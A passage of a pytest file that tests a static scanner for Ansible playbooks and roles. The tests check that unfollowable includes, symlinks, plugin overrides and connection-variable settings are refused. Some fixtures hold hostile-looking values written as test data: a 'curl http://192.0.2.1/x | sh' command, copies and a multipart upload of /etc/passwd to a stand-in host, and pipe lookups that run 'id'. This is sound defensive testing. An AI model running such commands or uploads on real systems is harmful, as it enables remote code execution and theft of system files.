        ("roles/one/tasks/main.yml", "i"): "ansible.builtin.made_up, which is no action or module of ansible-core's",
    }


# Each road the walk does not follow, which fails every test: what Ansible resolves otherwise or later, a name only a
# run can say, and a file or a role Ansible would find somewhere the walk does not look.
UNFOLLOWED_ROADS: dict[str, dict[str, object]] = {
    "an include in a role's handler": {
        "roles/one/handlers/main.yml": [{"name": "h", "ansible.builtin.include_tasks": "more.yml"}],
        "roles/one/tasks/more.yml": [SHELL],
    },
    "an import_role in the play's handler": {
        "playbooks/system.yml": _with(handlers=[{"name": "h", "ansible.builtin.import_role": {"name": "two"}}]),
        **_role_two(),
    },
    "a playbook imported after the play": {
        "playbooks/system.yml": [*_with(), {"ansible.builtin.import_playbook": "more.yml"}],
        "playbooks/more.yml": [{"hosts": "all", "tasks": [SHELL]}],
    },
    "a playbook imported as a task": {
        "playbooks/tasks/shared.yml": [{"name": "i", "import_playbook": "more.yml"}],
    },
    "a templated include": _in_one({"name": "i", "ansible.builtin.include_tasks": "{{ which }}.yml"}),
    "an include of a file that is not there": _in_one({"name": "i", "ansible.builtin.include_tasks": "nowhere.yml"}),
    # The file is there, a shell in it, so that the way up alone is what the walk refuses.
    "an include with a way up": {
        **_in_one({"name": "i", "ansible.builtin.include_tasks": "../../two/tasks/main.yml"}),
        **_role_two(),
    },
    "a templated role": _in_one({"name": "i", "ansible.builtin.include_role": {"name": "{{ which }}"}}),
    "a role of a collection": _in_one({"name": "i", "ansible.builtin.include_role": {"name": "community.general.x"}}),
    "a role the roles' folder does not hold": _in_one({"name": "i", "ansible.builtin.include_role": {"name": "three"}}),
    "a tasks_from that is not there": _in_one(
        {"name": "i", "ansible.builtin.include_role": {"name": "one", "tasks_from": "nowhere"}}
    ),
    "a templated tasks_from": _in_one(
        {"name": "i", "ansible.builtin.include_role": {"name": "one", "tasks_from": "{{ which }}"}}
    ),
    "a role in the play's own roles folder": {"playbooks/roles/one/tasks/main.yml": [SHELL]},
    "a play's collections keyword": {"playbooks/system.yml": _with(collections=["community.general"])},
    "a task's collections keyword": _in_one({**PING, "collections": ["community.general"]}),
    "a role's collections in its meta": {"roles/one/meta/main.yml": {"collections": ["community.general"]}},
    "a templated vars_files": {"playbooks/system.yml": _with(vars_files=["{{ which }}.yml"])},
    "a template outside a role": {
        "playbooks/tasks/shared.yml": [{"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}}],
    },
    "a template that includes another": {
        **_in_one({"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}}),
        "roles/one/templates/x.j2": "{% include 'y.j2' %}\n",
        "roles/one/templates/y.j2": "{{ lookup('ansible.builtin.pipe', 'id') }}\n",
    },
    "a template that includes another, its whitespace kept": {
        **_in_one({"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}}),
        "roles/one/templates/x.j2": "{%+ include 'y.j2' %}\n",
        "roles/one/templates/y.j2": "{{ lookup('ansible.builtin.pipe', 'id') }}\n",
    },
    # Review 50's high 1: a task file Ansible looks for elsewhere first, a decoy planted where it looks.
    "an import in a file a role's include brought in": {
        **_in_one({"name": "i", "include_tasks": "inner.yml"}),
        "roles/one/tasks/inner.yml": [{"name": "j", "ansible.builtin.import_tasks": "more.yml"}],
        "roles/one/tasks/more.yml": [PING],
        "roles/one/tasks/tasks/more.yml": [SHELL],
    },
    "an import in a file a role's import brought in": {
        **_in_one({"name": "i", "ansible.legacy.import_tasks": "inner.yml"}),
        "roles/one/tasks/inner.yml": [{"name": "j", "import_tasks": "more.yml"}],
        "roles/one/tasks/more.yml": [PING],
        "roles/one/tasks/tasks/more.yml": [SHELL],
    },
    "an import in a role's file reached first as its entry, then by an include": {
        "playbooks/system.yml": _with(
            tasks=[{"name": "e", "ansible.builtin.include_role": {"name": "one", "tasks_from": "inner"}}]
        ),
        **_in_one({"name": "i", "include_tasks": "inner.yml"}),
        "roles/one/tasks/inner.yml": [{"name": "j", "import_tasks": "more.yml"}],
        "roles/one/tasks/more.yml": [PING],
        "roles/one/tasks/tasks/more.yml": [SHELL],
    },
    "an import two files below the play": {
        "playbooks/tasks/shared.yml": [{"name": "i", "ansible.builtin.import_tasks": "a.yml"}],
        "playbooks/tasks/a.yml": [{"name": "j", "ansible.builtin.import_tasks": "b.yml"}],
        "playbooks/tasks/b.yml": [PING],
        "playbooks/b.yml": [SHELL],
    },
    "an include two files below the play": {
        "playbooks/tasks/shared.yml": [{"name": "i", "ansible.builtin.include_tasks": "a.yml"}],
        "playbooks/tasks/a.yml": [{"name": "j", "include_tasks": "b.yml"}],
        "playbooks/tasks/b.yml": [PING],
        "playbooks/b.yml": [SHELL],
    },
    # Review 50's high 2: what Ansible takes from the play's folder and a role's, beyond the walk.
    "filter plugins beside the play": {"playbooks/filter_plugins/x.py": ""},
    "vars plugins beside the play": {"playbooks/vars_plugins/x.py": ""},
    "collections beside the play": {"playbooks/collections/ansible_collections/x/y/plugins/modules/z.py": ""},
    "an action named as Ansible's normal beside the play": {"playbooks/action_plugins/normal.py": ""},
    "a module named as Ansible's setup beside the play": {"playbooks/library/setup.py": ""},
    "a module_utils named as Ansible's basic beside the play": {"playbooks/module_utils/basic.py": ""},
    "a module_utils package named as Ansible's common beside the play": {
        "playbooks/module_utils/common/__init__.py": ""
    },
    "an action named as Ansible's alias beside the play": {"playbooks/action_plugins/_ping.py": ""},
    "group_vars beside the play": {"playbooks/group_vars/all.yml": {"x": 1}},
    "host_vars beside the play": {"playbooks/host_vars/alpha.yml": {"x": 1}},
    "callback plugins in a role": {"roles/one/callback_plugins/x.py": ""},
    "a library in a role": {"roles/one/library/x.py": ""},
    "module_utils in a role": {"roles/one/module_utils/x.py": ""},
    "doc fragments in a role": {"roles/one/doc_fragments/x.py": ""},
    "lookup plugins in a role the play's role includes": {
        **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two"}}),
        **_role_two(main=[PING]),
        "roles/two/lookup_plugins/x.py": "",
    },
    # A file of this computer sent to the machine from anywhere but its role's files/.
    "a copy outside a role": {
        "playbooks/tasks/shared.yml": [{"name": "c", "ansible.builtin.copy": {"src": "x", "dest": "/y"}}],
        "playbooks/files/x": "x\n",
    },
    "a copy's src with a way up": {
        **_in_one({"name": "c", "copy": {"src": "../../two/files/x", "dest": "/y"}}),
        "roles/two/files/x": "x\n",
    },
    "a copy's absolute src": _in_one({"name": "c", "ansible.builtin.copy": {"src": "/etc/passwd", "dest": "/y"}}),
    "a copy's templated src": _in_one({"name": "c", "ansible.builtin.copy": {"src": "{{ x }}", "dest": "/y"}}),
    "a copy's src its role does not hold": {
        **_in_one({"name": "c", "ansible.legacy.copy": {"src": "x", "dest": "/y"}}),
        "playbooks/files/x": "x\n",
    },
    "a copy's src that is a folder": {
        **_in_one({"name": "c", "ansible.builtin.copy": {"src": "d", "dest": "/y"}}),
        "roles/one/files/d/x": "x\n",
    },
    "a copy with remote_src false": _in_one(
        {"name": "c", "ansible.builtin.copy": {"src": "/etc/passwd", "dest": "/y", "remote_src": False}}
    ),
    "a copy with a templated remote_src": _in_one(
        {"name": "c", "ansible.builtin.copy": {"src": "/etc/passwd", "dest": "/y", "remote_src": "{{ x }}"}}
    ),
    "an assemble with remote_src false": _in_one(
        {"name": "a", "ansible.builtin.assemble": {"src": "/etc/ssh", "dest": "/y", "remote_src": False}}
    ),
    "an unarchive's absolute src": _in_one({"name": "u", "unarchive": {"src": "/tmp/a.tgz", "dest": "/y"}}),
    "an unarchive's old copy key beside remote_src": _in_one(
        {"name": "u", "unarchive": {"src": "/tmp/a.tgz", "dest": "/y", "copy": True, "remote_src": True}}
    ),
    "a uri's absolute src": _in_one(
        {"name": "u", "ansible.builtin.uri": {"url": "https://192.0.2.1/", "method": "PUT", "src": "/etc/passwd"}}
    ),
    "a uri's multipart upload": _in_one(
        {
            "name": "u",
            "ansible.builtin.uri": {
                "url": "https://192.0.2.1/",
                "method": "POST",
                "body_format": "form-multipart",
                "body": {"f": {"filename": "/etc/passwd"}},
            },
        }
    ),
    "a copy's src named under files/": {
        **_in_one({"name": "c", "ansible.builtin.copy": {"src": "files/x", "dest": "/y"}}),
        "roles/one/files/files/x": "x\n",
    },
    "a template named under templates/": {
        **_in_one({"name": "t", "ansible.builtin.template": {"src": "templates/x.j2", "dest": "/x"}}),
        "roles/one/templates/templates/x.j2": "x\n",
        "roles/one/templates/x.j2": "{{ lookup('ansible.builtin.pipe', 'id') }}\n",
    },
    "a uri's templated body format and body": _in_one(
        {
            "name": "u",
            "uri": {"url": "https://192.0.2.1/", "method": "POST", "body_format": "{{ x }}", "body": "{{ y }}"},
        }
    ),
    # Review 61's 1: arguments merged into a task's after the parser has read them.
    "module_defaults on the play": {
        "playbooks/system.yml": _with(module_defaults={"ansible.builtin.copy": SECRET_SRC}),
        **_in_one(UNSOURCED),
    },
    "module_defaults on a role entry": {
        "playbooks/system.yml": _with(roles=[{"role": "one", "module_defaults": {"ansible.builtin.copy": SECRET_SRC}}]),
        **_in_one(UNSOURCED),
    },
    "module_defaults on a meta dependency": {
        "roles/one/meta/main.yml": {
            "dependencies": [{"role": "two", "module_defaults": {"ansible.builtin.copy": SECRET_SRC}}]
        },
        **_role_two(main=[UNSOURCED]),
    },
    "module_defaults on a block": _in_one(
        {"name": "b", "block": [UNSOURCED], "module_defaults": {"ansible.builtin.copy": SECRET_SRC}}
    ),
    "module_defaults on a task": _in_one({**UNSOURCED, "module_defaults": {"ansible.builtin.copy": SECRET_SRC}}),
    "module_defaults in an include's apply": {
        **_in_one(
            {
                "name": "i",
                "include_tasks": {"file": "more.yml", "apply": {"module_defaults": {"copy": SECRET_SRC}}},
            }
        ),
        "roles/one/tasks/more.yml": [UNSOURCED],
    },
    "module_defaults turning an assemble's remote_src off": _in_one(
        {
            "name": "a",
            "ansible.builtin.assemble": {"src": "/etc/ssh", "dest": "/y"},
            "module_defaults": {"ansible.builtin.assemble": {"remote_src": False}},
        }
    ),
    "a connection variable set through module_defaults": _in_one(
        {
            "name": "f",
            "ansible.builtin.set_fact": {"one_y": 1},
            "module_defaults": {"ansible.builtin.set_fact": {NAME: LOOSE}},
        }
    ),
    # Review 67's 6: module_defaults in the forms Ansible takes besides a mapping, a list of them and a template.
    "module_defaults as a list on a task": _in_one(
        {**UNSOURCED, "module_defaults": [{"ansible.builtin.copy": SECRET_SRC}]}
    ),
    "module_defaults as a template on the play": {
        "playbooks/system.yml": _with(module_defaults="{{ md }}"),
        **_in_one(UNSOURCED),
    },
    # Review 67's 3: an include's apply, which Ansible loads as a block, with a block's collections keyword, under which
    # the short name of a role included below it is a collection's.
    "collections in an include's apply": {
        **_in_one({"name": "i", "ansible.builtin.include_tasks": {"file": "more.yml", "apply": {"collections": ZR}}}),
        "roles/one/tasks/more.yml": [{"name": "r", "ansible.builtin.include_role": {"name": "two"}}],
        **_role_two(main=[PING]),
    },
    "collections in an include_role's apply": {
        **_in_one({"name": "r", "ansible.builtin.include_role": {"name": "two", "apply": {"collections": ZR}}}),
        **_role_two(main=[PING]),
    },
    "a copy's args given as one template": _in_one({**UNSOURCED, "args": "{{ given }}"}),
    "a fact's args given as one template": _in_one(
        {"name": "f", "ansible.builtin.set_fact": {"one_y": 1}, "args": "{{ given }}"}
    ),
    "a copy given one template as its arguments": _in_one({"name": "c", "ansible.builtin.copy": "{{ given }}"}),
    # Review 61's 3: a name Ansible reads otherwise than the walk, with a decoy where the walk would read it.
    "a copy of a name that starts with ~": {
        **_in_one({"name": "c", "ansible.builtin.copy": {"src": "~/x", "dest": "/y"}}),
        "roles/one/files/~/x": "x\n",
    },
    "a template of a name that starts with ~": {
        **_in_one({"name": "t", "ansible.builtin.template": {"src": "~/x.j2", "dest": "/x"}}),
        "roles/one/templates/~/x.j2": "x\n",
    },
    "a role's include of a name that starts with ~": {
        **_in_one({"name": "i", "ansible.builtin.include_tasks": "~/x.yml"}),
        "roles/one/tasks/~/x.yml": [PING],
    },
    "the play's import of a name that starts with ~": {
        "playbooks/system.yml": _with(pre_tasks=[{"name": "i", "ansible.builtin.import_tasks": "~/x.yml"}]),
        "playbooks/~/x.yml": [PING],
    },
    "a vars_files of a name that starts with ~": {
        "playbooks/system.yml": _with(vars_files=["~/x.yml"]),
        "playbooks/~/x.yml": {"one_y": 1},
    },
    "a role's tasks_from that starts with ~": {
        **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "one", "tasks_from": "~/x"}}),
        "roles/one/tasks/~/x.yml": [PING],
    },
    "a copy of a name that holds a $": {
        **_in_one({"name": "c", "ansible.builtin.copy": {"src": "$HOME/x", "dest": "/y"}}),
        "roles/one/files/$HOME/x": "x\n",
    },
    "the play's import of a quoted name": {
        "playbooks/system.yml": _with(pre_tasks=[{"name": "i", "ansible.builtin.import_tasks": "'tasks/shared.yml'"}]),
        "playbooks/'tasks/shared.yml'": [PING],
    },
    # Review 61's 5: a template that names another in a spelling the pattern did not read, and a task's string that
    # does.
    "a template task's own delimiters": {
        **_in_one({**TEMPLATE_TASK, "ansible.builtin.template": {**TEMPLATE_ARGS, **SQUARE}}),
        "roles/one/templates/x.j2": "[% include 'y.j2' %]\n",
        "roles/one/templates/y.j2": f"{PIPE}\n",
    },
    "a template task's own comment delimiters": _in_one(
        {**TEMPLATE_TASK, "ansible.builtin.template": {**TEMPLATE_ARGS, "comment_start_string": "[#"}}
    )
    | {"roles/one/templates/x.j2": "x\n"},
    "a template that sets its own delimiters": {
        **_in_one(TEMPLATE_TASK),
        "roles/one/templates/x.j2": f"{HEADER}[% include 'y.j2' %]\n",
        "roles/one/templates/y.j2": f"{PIPE}\n",
    },
    "an include in a task's string": {
        "playbooks/tasks/shared.yml": [{"name": "d", "ansible.builtin.debug": {"msg": "{% include 'x.j2' %}"}}],
        "playbooks/x.j2": f"{PIPE}\n",
    },
    "an include in a role's task's string": _in_one(
        {"name": "d", "ansible.builtin.debug": {"msg": "{%- include 'x.j2' %}"}}
    ),
    "an include in a role's defaults": {"roles/one/defaults/main.yml": {"one_x": "{%+ include 'x.j2' %}"}},
    "an include in the play's vars": {"playbooks/system.yml": _with(vars={"x": "{% include 'x.j2' %}"})},
    "a string that sets its own delimiters": _in_one(
        {"name": "d", "ansible.builtin.debug": {"msg": f"{HEADER}[% include 'x.j2' %]"}}
    ),
    # Review 61's 7: each of the statements by which a template names another.
    "a template that imports another": {
        **_in_one(TEMPLATE_TASK),
        "roles/one/templates/x.j2": "{% import 'y.j2' as y %}\n",
        "roles/one/templates/y.j2": f"{PIPE}\n",
    },
    "a template that takes from another": {
        **_in_one(TEMPLATE_TASK),
        "roles/one/templates/x.j2": "{% from 'y.j2' import m %}\n",
        "roles/one/templates/y.j2": "{% macro m() %}" + PIPE + "{% endmacro %}\n",
    },
    "a template that extends another": {
        **_in_one(TEMPLATE_TASK),
        "roles/one/templates/x.j2": "{% extends 'y.j2' %}\n",
        "roles/one/templates/y.j2": f"{PIPE}\n",
    },
    # Review 61's 6: a play-level file reached one below the play first, then two below, where its import is looked for
    # beside the play.
    "an import in a file reached one below the play, then two below": {
        "playbooks/system.yml": _with(
            pre_tasks=[
                {"name": "a", "ansible.builtin.import_tasks": "tasks/a.yml"},
                {"name": "shared", "ansible.builtin.import_tasks": "tasks/shared.yml"},
            ]
        ),
        "playbooks/tasks/shared.yml": [{"name": "i", "ansible.builtin.import_tasks": "a.yml"}],
        "playbooks/tasks/a.yml": [{"name": "j", "ansible.builtin.import_tasks": "b.yml"}],
        "playbooks/tasks/b.yml": [PING],
        "playbooks/b.yml": [SHELL],
    },
}
SCANS = (commands, outside, setting_connection_variables, reaching_this_computer)


def test_a_file_of_its_role_s_files_or_of_the_machine_s_is_followed(tmp_path: Path) -> None:
    sent = {"url": "https://192.0.2.1/", "method": "POST", "body_format": "form-multipart"}
    changes = (
        _in_one(
            {"name": "a", "ansible.builtin.copy": {"src": "x", "dest": "/y"}},
            {"name": "b", "ansible.builtin.copy": {"src": "d/x", "dest": "/y"}},
            {"name": "c", "ansible.builtin.copy": {"src": "/etc/hosts", "dest": "/y", "remote_src": True}},
            {"name": "d", "ansible.builtin.assemble": {"src": "/etc/ssh", "dest": "/y"}},
            {"name": "e", "ansible.builtin.unarchive": {"src": "/tmp/a.tgz", "dest": "/y", "remote_src": True}},
            {"name": "f", "ansible.builtin.uri": {**sent, "body": {"f": {"filename": "x"}, "g": "text"}}},
            {
                "name": "g",
                "ansible.builtin.uri": {"url": "https://192.0.2.1/", "body_format": "json", "body": "{{ x }}"},
            },
            {"name": "h", "ansible.builtin.copy": {"content": "{{ x }}", "dest": "/y"}},
        )
        | ROLE_FILE
        | {"roles/one/files/d/x": "x\n"}
    )
    play = _planted(tmp_path, changes)
    assert walk(play, tmp_path).entries
    assert reaching_this_computer(play, tmp_path, lookups={}) == []


def test_the_walk_follows_a_role_s_include_in_an_included_file_and_ends_where_one_includes_itself(
    tmp_path: Path,
) -> None:
    changes = {
        **_in_one({"name": "i", "include_tasks": "inner.yml"}),
        "roles/one/tasks/inner.yml": [{"name": "j", "include_tasks": "inner.yml", "when": "x"}, PING],
    }
    found = walk(_planted(tmp_path, changes), tmp_path)
    # Each task once, though the file is walked again deeper.
    assert [task["name"] for path, task in found.entries if path.name == "inner.yml"] == ["j", "t"]


@pytest.mark.parametrize("road", sorted(UNFOLLOWED_ROADS))
@pytest.mark.parametrize("scan", SCANS, ids=[scan.__name__ for scan in SCANS])
def test_a_road_the_walk_does_not_follow_fails_every_test(tmp_path: Path, road: str, scan) -> None:
    play = _planted(tmp_path, UNFOLLOWED_ROADS[road])
    with pytest.raises(Unfollowed):
        scan(play, tmp_path)


@pytest.mark.parametrize(
    ("task", "link", "said"),
    [
        ({"name": "c", "ansible.builtin.copy": {"src": "x", "dest": "/y"}}, "files/x", "no file of its role's files/"),
        (
            {"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}},
            "templates/x.j2",
            "not in its role's templates/",
        ),
    ],
)
def test_a_link_out_of_its_role_s_files_or_templates_is_refused(tmp_path: Path, task, link, said) -> None:
    elsewhere = tmp_path / "elsewhere"
    elsewhere.write_text("{{ lookup('ansible.builtin.pipe', 'id') }}\n")
    root = tmp_path / "repo"
    play = _planted(root, _in_one(task))
    (root / "roles" / "one" / link).parent.mkdir(parents=True, exist_ok=True)
    (root / "roles" / "one" / link).symlink_to(elsewhere)
    with pytest.raises(Unfollowed, match=said):
        walk(play, root)


def _folder_link(root: Path, name: str, elsewhere: Path) -> None:
    """root's name made a link to the folder elsewhere, which takes what root held there unless it is there."""
    link = root / name
    link.parent.mkdir(parents=True, exist_ok=True)
    if elsewhere.is_dir():
        shutil.rmtree(link, ignore_errors=True)
    elif link.is_dir():
        link.rename(elsewhere)
    else:
        elsewhere.mkdir(parents=True)
    link.symlink_to(elsewhere)


COPY_X = {"name": "c", "ansible.builtin.copy": {"src": "x", "dest": "/y"}}
TEMPLATE_X = {"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}}
# Review 67's 2: a role, or a folder of it, that is a link to a folder elsewhere, in or out of the checkout; and a file
# the play reaches that is a link out of the checkout. Each is planted under repo, elsewhere beside it, and said so.
LINK_ROADS = {
    "a role's files/ a link to a folder out of the checkout": (
        _in_one(COPY_X),
        lambda root, out: _folder_link(root, "roles/one/files", out),
        "a role's folder that is a link",
    ),
    "a role's templates/ a link to a folder out of the checkout": (
        _in_one(TEMPLATE_X),
        lambda root, out: _folder_link(root, "roles/one/templates", out),
        "a role's folder that is a link",
    ),
    "a role's files/ a link to another role's": (
        {**_in_one(COPY_X), "roles/two/files/x": "x\n"},
        lambda root, out: _folder_link(root, "roles/one/files", root / "roles/two/files"),
        "a role's folder that is a link",
    ),
    # Review 67's 12: a folder of the role's that the walk reads no file of here, a link all the same.
    "a role's vars/ a link to another role's": (
        {**_in_one(PING), "roles/two/vars/main.yml": {"v": 1}},
        lambda root, out: _folder_link(root, "roles/one/vars", root / "roles/two/vars"),
        "a role's folder that is a link",
    ),
    "a folder under a role's files/ that is a link out": (
        _in_one({"name": "c", "ansible.builtin.copy": {"src": "sub/x", "dest": "/y"}}),
        lambda root, out: _folder_link(root, "roles/one/files/sub", out),
        "no file of its role's files/",
    ),
    "a folder under a role's templates/ that is a link out": (
        _in_one({"name": "t", "ansible.builtin.template": {"src": "sub/x.j2", "dest": "/x"}}),
        lambda root, out: _folder_link(root, "roles/one/templates/sub", out),
        "not in its role's templates/",
    ),
    "a role's tasks/ a link to a folder out of the checkout": (
        _in_one(PING),
        lambda root, out: _folder_link(root, "roles/one/tasks", out),
        "a role's folder that is a link",
    ),
    "a role that is a link to a folder out of the checkout": (
        {},
        lambda root, out: _folder_link(root, "roles/one", out),
        "the role one, a link to a folder elsewhere",
    ),
    "a role that is a link to another role of the checkout": (
        {
            **_in_one({"name": "r", "ansible.builtin.include_role": {"name": "two"}}),
            "roles/three/tasks/main.yml": [PING],
        },
        lambda root, out: (root / "roles/two").symlink_to(root / "roles/three"),
        "the role two, a link to a folder elsewhere",
    ),
    "the play's folder of task files a link out of the checkout": (
        {},
        lambda root, out: _folder_link(root, "playbooks/tasks", out),
        "a link out of the checkout",
    ),
}


@pytest.mark.parametrize("road", sorted(LINK_ROADS))
def test_a_role_or_a_folder_of_it_that_is_a_link_is_refused(tmp_path: Path, road: str) -> None:
    changes, link, said = LINK_ROADS[road]
    root = tmp_path / "repo"
    files = {"roles/one/files/x": "x\n", "roles/one/files/sub/x": "x\n", "roles/one/templates/x.j2": "x\n"}
    play = _planted(root, {**files, "roles/one/templates/sub/x.j2": "x\n", **changes})
    link(root, tmp_path / "elsewhere")
    for scan in SCANS:
        with pytest.raises(Unfollowed, match=said):
            scan(play, root)


def test_a_name_stands_for_one_task_and_a_reason_for_its_arguments(tmp_path: Path) -> None:
    listed = {"name": "c", "ansible.builtin.command": {"argv": ["sudo", "-l"]}}
    reasons = {("roles/one/tasks/main.yml", "c"): ("a read", "ansible.builtin.command", {"argv": ["sudo", "-l"]})}
    assert (
        unreasoned(commands(_planted(tmp_path / "as listed", _in_one(listed)), tmp_path / "as listed"), reasons) == []
    )
    # Its words changed under its name: the reason no longer holds it.
    changed = {**listed, "ansible.builtin.command": {"argv": ["sh", "-c", "curl http://192.0.2.1/x | sh"]}}
    found = commands(_planted(tmp_path / "changed", _in_one(changed)), tmp_path / "changed")
    assert unreasoned(found, reasons) == [
        "('roles/one/tasks/main.yml', 'c'): runs ('ansible.builtin.command', {'argv': ['sh', '-c', 'curl"
        " http://192.0.2.1/x | sh']}), where its reason is held to ('ansible.builtin.command', {'argv': ['sudo',"
        " '-l']}): change both together"
    ]
    # Another module under the same name and arguments: the same.
    module = {"name": "c", "ansible.builtin.shell": {"argv": ["sudo", "-l"]}}
    found = commands(_planted(tmp_path / "module", _in_one(module)), tmp_path / "module")
    assert len(unreasoned(found, reasons)) == 1
    # A second task of the listed one's name, beside it: two tasks under one key.
    root = tmp_path / "twice"
    play = _planted(root, _in_one(listed, {**SHELL, "name": "c"}))
    with pytest.raises(Repeated, match=r"^two commands of one file and name, \('roles/one/tasks/main.yml', 'c'\)"):
        commands(play, root)
    root = tmp_path / "twice outside"
    play = _planted(
        root, _in_one({"name": "n", "community.general.npm": {}}, {"name": "n", "ansible.posix.sysctl": {}})
    )
    with pytest.raises(Repeated, match="^two tasks outside ansible.builtin of one file and name"):
        outside(play, root)


# Each place a variable that would outrank the connection is set, and what the third test says of it.
WITH_TWO = {**_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two"}}), **_role_two(main=[PING])}
VARIABLE_ROADS: dict[str, tuple[dict[str, object], str]] = {
    "a play's vars": (
        {"playbooks/system.yml": _with(vars={NAME: LOOSE})},
        f"playbooks/system.yml: the play's vars: {NAME}",
    ),
    "a play's vars_files": (
        {"playbooks/system.yml": _with(vars_files=["vars.yml"]), "playbooks/vars.yml": {NAME: LOOSE}},
        f"playbooks/vars.yml: {NAME}",
    ),
    "a play's vars_prompt": (
        {"playbooks/system.yml": _with(vars_prompt=[{"name": NAME, "prompt": "x"}])},
        f"playbooks/system.yml: the play's vars_prompt: {NAME}",
    ),
    "a role entry's vars": (
        {"playbooks/system.yml": _with(roles=[{"role": "one", "vars": {NAME: LOOSE}}])},
        f"playbooks/system.yml: a role's vars: {NAME}",
    ),
    "a role entry's params": (
        {"playbooks/system.yml": _with(roles=[{"role": "one", NAME: LOOSE}])},
        f"playbooks/system.yml: a role's params: {NAME}",
    ),
    "a meta dependency's vars": (
        {
            "roles/one/meta/main.yml": {"dependencies": [{"role": "two", "vars": {NAME: LOOSE}}]},
            **_role_two(main=[PING]),
        },
        f"roles/one/meta/main.yml: a role's vars: {NAME}",
    ),
    "a meta dependency's params": (
        {"roles/one/meta/main.yml": {"dependencies": [{"role": "two", NAME: LOOSE}]}, **_role_two(main=[PING])},
        f"roles/one/meta/main.yml: a role's params: {NAME}",
    ),
    "a role's defaults/main.yml": (
        {"roles/one/defaults/main.yml": {NAME: LOOSE}},
        f"roles/one/defaults/main.yml: {NAME}",
    ),
    "a role's defaults/main.yaml": (
        {"roles/one/defaults/main.yml": None, "roles/one/defaults/main.yaml": {NAME: LOOSE}},
        f"roles/one/defaults/main.yaml: {NAME}",
    ),
    "a role's vars/main/ folder": ({"roles/one/vars/main/a.yml": {NAME: LOOSE}}, f"roles/one/vars/main/a.yml: {NAME}"),
    "an include_role's vars_from": (
        {
            **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two", "vars_from": "other"}}),
            **_role_two(main=[PING]),
            "roles/two/vars/other.yml": {NAME: LOOSE},
        },
        f"roles/two/vars/other.yml: {NAME}",
    ),
    "the defaults of a role a role includes": (
        {**WITH_TWO, "roles/two/defaults/main.yml": {NAME: LOOSE}},
        f"roles/two/defaults/main.yml: {NAME}",
    ),
    "a task's vars": (_in_one({**PING, "vars": {NAME: LOOSE}}), f"roles/one/tasks/main.yml: t: {NAME}"),
    "a block's vars": (
        _in_one({"name": "b", "block": [PING], "vars": {NAME: LOOSE}}),
        f"roles/one/tasks/main.yml: b: {NAME}",
    ),
    "a fact": (
        _in_one({"name": "t", "ansible.builtin.set_fact": {NAME: LOOSE}}),
        f"roles/one/tasks/main.yml: t: {NAME}",
    ),
    "a fact as k=v": (_in_one({"name": "t", "set_fact": f"{NAME}=x"}), f"roles/one/tasks/main.yml: t: {NAME}"),
    "a fact of a templated name": (
        _in_one({"name": "t", "ansible.builtin.set_fact": {"{{ 'ansible_ssh_' ~ 'common_args' }}": LOOSE}}),
        "roles/one/tasks/main.yml: t: a fact of a templated name, \"{{ 'ansible_ssh_' ~ 'common_args' }}\"",
    ),
    "a register": (_in_one({**PING, "register": NAME}), f"roles/one/tasks/main.yml: t: {NAME}"),
    "a loop's variable": (
        _in_one({**PING, "loop": [1], "loop_control": {"loop_var": NAME}}),
        f"roles/one/tasks/main.yml: t: loop_control: {NAME}",
    ),
    "a loop's index": (
        _in_one({**PING, "loop": [1], "loop_control": {"index_var": NAME}}),
        f"roles/one/tasks/main.yml: t: loop_control: {NAME}",
    ),
    "an include's apply": (
        {
            **_in_one({"name": "t", "include_tasks": {"file": "more.yml", "apply": {"vars": {NAME: LOOSE}}}}),
            "roles/one/tasks/more.yml": [PING],
        },
        f"roles/one/tasks/main.yml: t: its apply's vars: {NAME}",
    ),
    "add_host of the host itself": (
        _in_one({"name": "t", "ansible.builtin.add_host": {"name": "{{ inventory_hostname }}", NAME: LOOSE}}),
        f"roles/one/tasks/main.yml: t: add_host: {NAME}",
    ),
    "an include of variables": (
        _in_one({"name": "t", "ansible.builtin.include_vars": "x.yml"}),
        "roles/one/tasks/main.yml: t: an include of variables, {'_raw_params': 'x.yml'}",
    ),
}


@pytest.mark.parametrize("road", sorted(VARIABLE_ROADS))
def test_a_variable_that_would_outrank_the_connection_is_found_wherever_it_is_set(tmp_path: Path, road: str) -> None:
    changes, said = VARIABLE_ROADS[road]
    assert setting_connection_variables(_planted(tmp_path, changes), tmp_path) == [said]


# Each road to this computer, and what the fourth test says of it.
COPY = {"src": "x", "dest": "/tmp/y"}
# The role's tasks file, where most roads are planted, and a debug task of a message.
ONE = "roles/one/tasks/main.yml"


def _debug_of(msg: str) -> dict[str, object]:
    return {"name": "t", "ansible.builtin.debug": {"msg": msg}}


def _said(text: str, what: str) -> str:
    """What the fourth test says of text, in the role's tasks file, where it finds what."""
    return f"{ONE}: {what}: {text!r}"


# Review 67's 8 to 11: a file test, the finding of it and of a condition made of one template; a condition with a
# comment's opener in a string, and one whose string holds a template, which Ansible renders as it evaluates it.
EXISTS = "'/x' is exists"
FOUND_EXISTS = "the test exists, which reads this computer's paths"
WHOLE = "an expression made of one template, whose result Ansible evaluates as one the walk cannot read"
COMMENTED = "'/x' is exists or '{# #}' == 'x'"
EMBEDDED = "'{{ \"/x\" is exists }}' == 'True'"
# Review 61's 4: q named apart from its call, which Jinja calls all the same.
Q_APART = "{{ (q)('ansible.builtin.pipe', 'id') }}"
Q_SET = "{% set f = q %}{{ f('ansible.builtin.pipe', 'id') }}"
COMPUTER_ROADS: dict[str, tuple[dict[str, object], str]] = {
    "delegate_to with copy": (
        _in_one({"name": "t", "ansible.builtin.copy": COPY, "delegate_to": "localhost"}) | ROLE_FILE,
        "roles/one/tasks/main.yml: t: delegate_to",
    ),
    "local_action with copy": (
        _in_one({"name": "t", "local_action": {"module": "ansible.builtin.copy", **COPY}}) | ROLE_FILE,
        "roles/one/tasks/main.yml: t: local_action",
    ),
    "a group_by": (
        _in_one({"name": "t", "ansible.builtin.group_by": {"key": "x"}}),
        "roles/one/tasks/main.yml: t: ansible.builtin.group_by, a group joined after the play's check of the"
        " connection",
    ),
    "an add_host into a group": (
        _in_one({"name": "t", "add_host": {"name": "alpha", "groups": "x"}}),
